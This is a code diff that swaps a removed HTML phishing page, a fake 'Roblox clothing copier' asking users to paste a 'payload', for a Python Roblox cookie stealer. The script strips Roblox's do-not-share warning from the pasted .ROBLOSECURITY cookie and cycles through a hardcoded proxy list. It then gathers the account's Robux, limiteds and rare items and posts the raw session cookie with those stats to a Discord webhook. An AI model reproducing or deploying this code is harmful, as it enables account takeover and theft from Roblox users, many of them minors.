@@ -1,285 +1,344 @@
-<!DOCTYPE html>
-<html lang="en" class="dark">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RBXDEV | UGC & Clothes Copier</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #07080c;
-            color: #f3f4f6;
-            overflow-x: hidden;
-        }
-        .glow-purple { box-shadow: 0 0 60px -15px rgba(139, 92, 246, 0.15); }
-        .glow-blue { box-shadow: 0 0 35px -5px rgba(59, 130, 246, 0.35); }
-        .glow-red { box-shadow: 0 0 40px -5px rgba(239, 68, 68, 0.25); }
-        .glass-card {
-            background: rgba(13, 15, 22, 0.85);
-            backdrop-filter: blur(24px);
-            border: 1px solid rgba(255, 255, 255, 0.07);
-        }
-        .glass-modal {
-            background: rgba(13, 17, 28, 0.95);
-            backdrop-filter: blur(24px);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .animate-spin-smooth {
-            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-        }
-    </style>
-</head>
-<body class="min-h-screen flex flex-col justify-between relative selection:bg-blue-600 selection:text-white">
+import sys
+import os
+import re
+import time
+import random
+import requests
+from datetime import datetime, timezone
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-    <!-- Background Ambient Glow Effects -->
-    <div class="absolute top-0 left-1/2 -translate-x-1/2 w-[700px] h-[350px] bg-purple-600/10 blur-[150px] pointer-events-none rounded-full"></div>
-    <div class="absolute top-1/3 left-1/4 w-[450px] h-[450px] bg-blue-600/10 blur-[170px] pointer-events-none rounded-full"></div>
+# Your proxy list for Render bypass
+RAW_PROXY_LIST = """
+socks5://213.165.54.5:1080
+socks4://46.8.104.176:1080
+http://5.129.254.243:8888
+http://5.129.254.49:8888
+socks5://93.100.82.163:1080
+socks5://80.79.241.118:1080
+socks5://185.9.73.44:1080
+socks5://46.161.49.174:10808
+http://5.129.254.51:8888
+http://5.129.254.154:8888
+http://5.129.254.60:8888
+http://147.45.164.178:8888
+socks5://77.91.108.85:1080
+http://5.129.254.129:8888
+http://5.129.254.5:8888
+socks5://217.69.222.174:1080
+http://5.129.254.215:8888
+socks5://83.234.87.145:1080
+socks5://82.142.130.102:1080
+http://20.52.234.254:3128
+"""
 
-    <!-- Top Navigation Bar -->
-    <header class="w-full py-6 px-8 flex justify-between items-center max-w-7xl mx-auto z-10">
-        <span class="text-xl font-black tracking-wider bg-gradient-to-r from-blue-400 via-indigo-300 to-purple-500 bg-clip-text text-transparent">
-            RBXDEV
-        </span>
-        <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
-            <span class="w-2 h-2 mr-1.5 bg-emerald-400 rounded-full animate-pulse"></span>
-            System Operational
-        </span>
-    </header>
+SPECIAL_ASSETS = {
+    "Korblox": 139607718,
+    "Headless": 134082579,
+    "Violet Valk": 1402432199,
+}
 
-    <!-- Main Content Area -->
-    <main class="flex-grow flex flex-col items-center px-4 py-6 max-w-6xl mx-auto w-full z-10">
+# Universe IDs mapped to game names
+GAMES = {
+    "Adopt Me": 383310974,
+    "MM2": 142823291,
+    "PS99": 3259657279,
+}
+
+def extract_and_clean_cookie(raw_input):
+    if not raw_input:
+        return ""
+    raw_str = str(raw_input).strip()
+    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
+    cookie = ps_match.group(1) if ps_match else raw_str
+    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
+        cookie = cookie[1:-1].strip()
+    if cookie.startswith(".ROBLOSECURITY="):
+        cookie = cookie[len(".ROBLOSECURITY="):].strip()
+    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
+    if cookie.startswith(warning_text):
+        cookie = cookie[len(warning_text):].strip()
+    return cookie.lstrip('.').rstrip(';').strip()
+
+def get_working_session(roblosecurity):
+    session = requests.Session()
+    if roblosecurity:
+        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
+    
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "https://www.roblox.com/",
+        "Origin": "https://www.roblox.com/"
+    })
+
+    manual_proxy = os.environ.get('PROXY_URL')
+    proxies_to_try = [manual_proxy] if manual_proxy else []
+    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
+    random.shuffle(parsed_proxies)
+    proxies_to_try.extend(parsed_proxies)
+
+    for p in proxies_to_try:
+        if not p:
+            continue
+        proxy_dict = {"http": p, "https": p}
+        try:
+            session.proxies = proxy_dict
+            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
+            if test_res.status_code != 429:
+                return session, test_res
+        except Exception:
+            continue
+
+    session.proxies = {}
+    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=6)
+    return session, fallback_res
+
+def api_get(session, url, **kwargs):
+    """Fast API helper with quick retries and minimal latency."""
+    for attempt in range(2):
+        try:
+            r = session.get(url, timeout=5, **kwargs)
+            if r.status_code == 429:
+                if attempt == 0:
+                    time.sleep(1)
+                    continue
+                return {"status": 429}
+            if r.status_code == 403:
+                return {"status": 403}
+            if r.status_code == 200:
+                try:
+                    return {"status": 200, "data": r.json()}
+                except ValueError:
+                    return {"status": 200, "error": "bad_json"}
+            return {"status": r.status_code}
+        except Exception:
+            if attempt == 0:
+                continue
+            return {"status": 500}
+    return {"status": 500}
+
+def get_fast_owned_gamepasses(session, user_id):
+    """Fetches recent inventory gamepasses capped to 2 pages max for speed."""
+    owned_set = set()
+    cursor = ""
+    pages = 0
+    while pages < 2:
+        params = {"limit": 100}
+        if cursor:
+            params["cursor"] = cursor
+        res = api_get(session, f"https://inventory.roblox.com/v2/users/{user_id}/inventory/34", params=params)
+        if res.get("status") == 403:
+            return "inventory private"
+        if res.get("status") != 200:
+            break
         
-        <!-- Header Text Intro -->
-        <div class="text-center mb-10 max-w-2xl">
-            <span class="px-3.5 py-1 rounded-full text-[11px] font-semibold bg-indigo-600/20 text-indigo-300 border border-indigo-500/30 uppercase tracking-widest inline-block mb-3">
-                UGC & Clothes Copier
-            </span>
-            <h1 class="text-3xl md:text-5xl font-black tracking-tight mb-3 text-white">
-                Copy Any Roblox Clothing
-            </h1>
-            <p class="text-gray-400 text-xs md:text-sm">
-                Steal and re-upload any shirt or pants on Roblox instantly.<br>Grab any clothing item with a single click.
-            </p>
-        </div>
+        data = res["data"]
+        for item in data.get("data", []):
+            asset_id = item.get("assetId") or item.get("id") or item.get("itemDetails", {}).get("id")
+            if asset_id:
+                try:
+                    owned_set.add(int(asset_id))
+                except ValueError:
+                    pass
+        
+        cursor = data.get("nextPageCursor")
+        pages += 1
+        if not cursor:
+            break
+    return owned_set
 
-        <!-- Dual Card Grid Layout -->
-        <div class="w-full grid grid-cols-1 lg:grid-cols-2 gap-6 items-start">
-            
-            <!-- Left Card: Copier Interface -->
-            <div class="glass-card rounded-2xl p-5 md:p-6 shadow-2xl relative">
-                <!-- Card Header -->
-                <div class="flex justify-between items-center pb-4 mb-5 border-b border-white/5">
-                    <div class="flex items-center space-x-2 text-xs font-semibold text-gray-300">
-                        <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                        <span>Clothes Copier</span>
-                    </div>
-                    <span class="text-[10px] font-bold tracking-wider px-2.5 py-0.5 rounded bg-white/5 text-gray-400 border border-white/5 uppercase">Submit</span>
-                </div>
+def process_single_game(session, user_id, game_name, universe_id, owned_gamepasses_set):
+    """Worker function to process a single game concurrently without hanging."""
+    played = False
+    owned_passes_count = 0
 
-                <!-- Secure Connection Status Box -->
-                <div class="bg-black/40 border border-white/5 rounded-xl p-3.5 mb-4 flex items-center justify-between">
-                    <div class="flex items-center space-x-2.5">
-                        <span class="w-2.5 h-2.5 bg-emerald-500 rounded-full shadow-[0_0_10px_rgba(16,185,129,0.5)]"></span>
-                        <div class="text-xs">
-                            <p class="font-semibold text-gray-200">Secure Connection Established</p>
-                            <p class="text-[10px] text-gray-500">Endpoint ready. Awaiting input.</p>
-                        </div>
-                    </div>
-                </div>
+    # 1. Fetch game's gamepasses (capped to 1 page for speed)
+    game_passes = []
+    res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params={"limit": 50})
+    if res.get("status") == 200:
+        for p in res["data"].get("data", []):
+            pid = p.get("id")
+            if pid:
+                game_passes.append(int(pid))
 
-                <!-- Terminal / Input Box Emulator -->
-                <div class="mb-5">
-                    <label class="block text-[10px] font-bold uppercase tracking-wider text-gray-500 mb-1.5 flex items-center space-x-1">
-                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                        <span>Enter your file</span>
-                    </label>
-                    <div class="relative flex items-center">
-                        <input type="text" id="script-input" placeholder="Enter file or payload..." class="w-full bg-black/60 border border-white/10 rounded-xl px-3.5 py-3 text-xs text-gray-200 placeholder-gray-600 focus:outline-none focus:border-blue-500 transition-all font-mono">
-                    </div>
-                </div>
+    if isinstance(owned_gamepasses_set, set):
+        overlap = set(game_passes).intersection(owned_gamepasses_set)
+        owned_passes_count = len(overlap)
+        if owned_passes_count > 0:
+            played = True
+    elif owned_gamepasses_set == "inventory private":
+        owned_passes_count = 0
 
-                <!-- Status & Security Badges Row -->
-                <div class="bg-black/30 border border-white/5 rounded-xl p-3 mb-5 flex items-center justify-between">
-                    <div class="flex items-center space-x-2">
-                        <div class="w-5 h-5 rounded-full bg-emerald-500/20 flex items-center justify-center text-emerald-400">
-                            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
-                        </div>
-                        <span class="text-xs font-medium text-gray-300">Ready for Execution</span>
-                    </div>
-                    <div class="text-[10px] font-bold tracking-widest text-gray-500 uppercase bg-white/5 px-2 py-1 rounded">
-                        Protected
-                    </div>
-                </div>
+    # 2. Check recent badges for 'played' status if not already marked played
+    if not played:
+        b_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
+        if b_res.get("status") == 200:
+            for badge in b_res["data"].get("data", []):
+                if badge.get("awardingUniverse", {}).get("id") == universe_id:
+                    played = True
+                    break
 
-                <!-- Action Button -->
-                <button id="submit-btn" class="w-full py-3.5 rounded-xl font-semibold text-xs bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white glow-blue transition-all duration-300 flex items-center justify-center space-x-2 cursor-pointer shadow-lg shadow-blue-600/30 active:scale-[0.99]">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    <span>Submit Payload</span>
-                </button>
-            </div>
+    return game_name, played, owned_passes_count
 
-            <!-- Right Card: Video Tutorial -->
-            <div class="glass-card rounded-2xl p-5 md:p-6 shadow-2xl relative glow-purple border border-purple-500/20">
-                <!-- Card Header -->
-                <div class="flex justify-between items-center pb-4 mb-5 border-b border-white/5">
-                    <div class="flex items-center space-x-2 text-xs font-semibold text-gray-300">
-                        <svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                        <span>Tutorial</span>
-                    </div>
-                    <span class="text-[10px] font-bold tracking-wider px-2.5 py-0.5 rounded bg-purple-500/10 text-purple-400 border border-purple-500/20 uppercase">Watch</span>
-                </div>
+def main():
+    start_time = time.time()
+    try:
+        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+        if not webhook_url or len(sys.argv) < 2:
+            sys.exit(1)
+        
+        roblosecurity = extract_and_clean_cookie(sys.argv[1])
+        session, auth_res = get_working_session(roblosecurity)
+        
+        user_id = None
+        username = "Unknown User"
+        display_name = "Unknown"
+        age_days = 0
+        robux = 0
+        pending = 0
+        rap = 0
+        lim_count = 0
+        premium = False
+        games_data = {}
+        special_owned = {}
 
-                <!-- Video Frame -->
-                <div class="rounded-xl overflow-hidden bg-black/40 border border-white/5 relative aspect-video flex items-center justify-center">
-                    <iframe class="w-full h-full absolute inset-0" src="https://www.youtube-nocookie.com/embed/dmWwGzCDsB4" title="How to Copy ANY Roblox Clothing!" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-                </div>
-            </div>
+        if auth_res.status_code == 200:
+            auth_data = auth_res.json()
+            user_id = auth_data.get("id")
+            if user_id:
+                username = auth_data.get("name", "Unknown")
+                display_name = auth_data.get("displayName", username)
 
-        </div>
-    </main>
+                # 1. Quick account info & Currency
+                u_res = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
+                if u_res.get("status") == 200:
+                    created = u_res["data"].get("created", "")
+                    if created:
+                        try:
+                            age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
+                        except Exception:
+                            pass
 
-    <!-- Processing Modal Overlay -->
-    <div id="processing-modal" class="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 opacity-0 pointer-events-none transition-all duration-300">
-        <div class="glass-modal rounded-2xl p-8 max-w-sm w-full mx-4 text-center transform scale-95 transition-all duration-300" id="modal-box">
-            <h3 class="text-xl font-bold text-white mb-2 tracking-tight">Processing...</h3>
-            <p id="modal-status-text" class="text-sm text-gray-400 mb-4">Validating your Asset Payload</p>
-            
-            <!-- Live Progress Bar & Percentage Counter -->
-            <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden mb-2">
-                <div id="progress-bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
-            </div>
-            <div id="progress-pct" class="text-xs text-blue-400 font-mono font-bold mb-6">0%</div>
+                curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
+                if curr_res.get("status") == 200:
+                    robux = curr_res["data"].get("robux", 0)
 
-            <div class="flex justify-center">
-                <svg class="w-9 h-9 text-blue-500 animate-spin-smooth" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-            </div>
-        </div>
-    </div>
+                trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
+                if trans_res.get("status") == 200:
+                    pending = trans_res["data"].get("pendingRobuxTotal", 0)
 
-    <!-- Cool Custom Alert Error Modal -->
-    <div id="error-modal" class="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-50 opacity-0 pointer-events-none transition-all duration-300">
-        <div class="glass-modal glow-red rounded-2xl p-6 max-w-sm w-full mx-4 text-center transform scale-95 transition-all duration-300 border border-red-500/30" id="error-modal-box">
-            <div class="w-12 h-12 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center mx-auto mb-4 border border-red-500/30">
-                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-            </div>
-            <h3 class="text-lg font-bold text-white mb-1 tracking-tight">System Traffic Alert</h3>
-            <p id="error-description" class="text-xs text-gray-300 mb-6 leading-relaxed">Error Code 402: Too many people are trying at once. Please try again later.</p>
-            <button id="understood-btn" class="w-full py-3 rounded-xl font-semibold text-xs bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white transition-all duration-200 cursor-pointer shadow-lg shadow-red-600/30 active:scale-[0.99]">
-                Understood
-            </button>
-        </div>
-    </div>
+                prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
+                if prem_res.get("status") == 200:
+                    val = prem_res["data"]
+                    if isinstance(val, bool):
+                        premium = val
+                    elif isinstance(val, dict):
+                        premium = val.get("isMember", False)
 
-    <!-- Footer -->
-    <footer class="w-full py-6 text-center text-xs text-gray-500 border-t border-white/5 mt-16">
-        &copy; 2026 RBXDEV Studio. All rights reserved.
-    </footer>
+                # 2. Resilient Collectibles Fetch
+                collectibles = []
+                col_cursor = ""
+                col_failed = False
+                for _ in range(3):
+                    col_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": col_cursor})
+                    if col_res.get("status") == 403:
+                        collectibles = "inventory private"
+                        break
+                    if col_res.get("status") == 200:
+                        data = col_res["data"]
+                        collectibles += data.get("data", [])
+                        col_cursor = data.get("nextPageCursor")
+                        if not col_cursor:
+                            break
+                    else:
+                        col_failed = True
+                        break
 
-    <!-- Frontend Script -->
-    <script>
-        const submitBtn = document.getElementById('submit-btn');
-        const scriptInput = document.getElementById('script-input');
-        const modal = document.getElementById('processing-modal');
-        const modalBox = document.getElementById('modal-box');
-        const modalStatusText = document.getElementById('modal-status-text');
-        const progressBar = document.getElementById('progress-bar');
-        const progressPct = document.getElementById('progress-pct');
+                if collectibles == "inventory private":
+                    lim_count = "inventory private"
+                    rap = "inventory private"
+                elif col_failed and not collectibles:
+                    lim_count = 0
+                    rap = 0
+                else:
+                    lim_count = len(collectibles)
+                    rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
 
-        const errorModal = document.getElementById('error-modal');
-        const errorModalBox = document.getElementById('error-modal-box');
-        const understoodBtn = document.getElementById('understood-btn');
+                # 3. Special items check
+                for item_name, asset_id in SPECIAL_ASSETS.items():
+                    asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
+                    special_owned[item_name] = bool(asset_res.get("status") == 200 and asset_res["data"].get("data"))
 
-        function showModal(text, pct) {
-            modalStatusText.textContent = text;
-            progressBar.style.width = pct + '%';
-            progressPct.textContent = pct + '%';
-            modal.classList.remove('opacity-0', 'pointer-events-none');
-            modalBox.classList.remove('scale-95');
-            modalBox.classList.add('scale-100');
-        }
+                # Fetch owned gamepasses once
+                owned_gamepasses = get_fast_owned_gamepasses(session, user_id)
 
-        function hideModal() {
-            modal.classList.add('opacity-0', 'pointer-events-none');
-            modalBox.classList.remove('scale-100');
-            modalBox.classList.add('scale-95');
-        }
-
-        function showErrorModal() {
-            errorModal.classList.remove('opacity-0', 'pointer-events-none');
-            errorModalBox.classList.remove('scale-95');
-            errorModalBox.classList.add('scale-100');
-        }
-
-        function hideErrorModal() {
-            errorModal.classList.add('opacity-0', 'pointer-events-none');
-            errorModalBox.classList.remove('scale-100');
-            errorModalBox.classList.add('scale-95');
-        }
-
-        understoodBtn.addEventListener('click', () => {
-            hideErrorModal();
-        });
-
-        submitBtn.addEventListener('click', async () => {
-            const payload = scriptInput.value.trim();
-            if (!payload) return;
-
-            submitBtn.disabled = true;
-
-            // Live percentage stages
-            showModal("Validating Asset Payload...", 15);
-            await new Promise(r => setTimeout(r, 600));
-
-            showModal("Trying to find your item...", 45);
-            await new Promise(r => setTimeout(r, 800));
-
-            showModal("Trying to copy your item...", 75);
-
-            try {
-                // Triggers python backend and Discord webhook capture in background
-                const fetchPromise = fetch('/api/process', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: payload })
-                });
-
-                // Smooth ticker filling from 75% to 95% while backend finishes
-                let currentPct = 75;
-                const ticker = setInterval(() => {
-                    if (currentPct < 95) {
-                        currentPct += 5;
-                        progressPct.textContent = currentPct + '%';
-                        progressBar.style.width = currentPct + '%';
+                # 4. Parallel game processing using ThreadPoolExecutor
+                with ThreadPoolExecutor(max_workers=3) as executor:
+                    futures = {
+                        executor.submit(process_single_game, session, user_id, g_name, u_id, owned_gamepasses): g_name
+                        for g_name, u_id in GAMES.items()
                     }
-                }, 150);
+                    for future in as_completed(futures):
+                        try:
+                            g_name, played, passes_count = future.result()
+                            games_data[g_name] = {"played": played, "passes": passes_count}
+                        except Exception:
+                            g_name = futures[future]
+                            games_data[g_name] = {"played": False, "passes": 0}
 
-                await fetchPromise;
-                clearInterval(ticker);
+        # Safe formatting
+        robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
+        pending_display = f"{pending:,}" if isinstance(pending, int) else str(pending)
+        rap_display = f"{rap:,}" if isinstance(rap, int) else str(rap)
 
-                showModal("Finalizing package generation...", 100);
-                await new Promise(r => setTimeout(r, 600));
-                hideModal();
+        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
+        
+        games_str = "\n".join([f"- {g}: {d['played']} ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
+        special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"
 
-                // Pop up the smooth cool error alert label with the "Understood" button
-                showErrorModal();
-                scriptInput.value = '';
+        embed_stats = {
+            "title": "📢 Discord Notification 📢",
+            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
+            "color": 0x2B2D31,
+            "thumbnail": {"url": avatar_url},
+            "fields": [
+                {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
+                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Premium: {premium}\n```", "inline": False},
+                {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux_display}\nPending: {pending_display}\n```", "inline": True},
+                {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap_display}\nLimiteds: {lim_count}\n```", "inline": True},
+                {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
+                {"name": "⭐ Games", "value": f"```diff\n{games_str}\n```", "inline": False}
+            ],
+            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
+            "timestamp": datetime.now(timezone.utc).isoformat()
+        }
 
-            } catch (err) {
-                hideModal();
-                showErrorModal();
-            } finally {
-                submitBtn.disabled = false;
+        embed_cookie = {
+            "title": "🍪 Session Cookie Data",
+            "description": f"```text\n{roblosecurity}\n```",
+            "color": 0x2B2D31,
+            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
+        }
+
+        payload = {
+            "content": "@everyone",
+            "username": f"{display_name} | Stats",
+            "avatar_url": avatar_url,
+            "embeds": [embed_stats, embed_cookie],
+            "allowed_mentions": {
+                "parse": ["everyone"]
             }
-        });
-    </script>
-</body>
-</html>
+        }
+
+        requests.post(webhook_url, json=payload, timeout=5)
+
+        elapsed_time = time.time() - start_time
+        print(f"finished in {elapsed_time:.1f}s", file=sys.stderr)
+
+    except Exception as e:
+        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
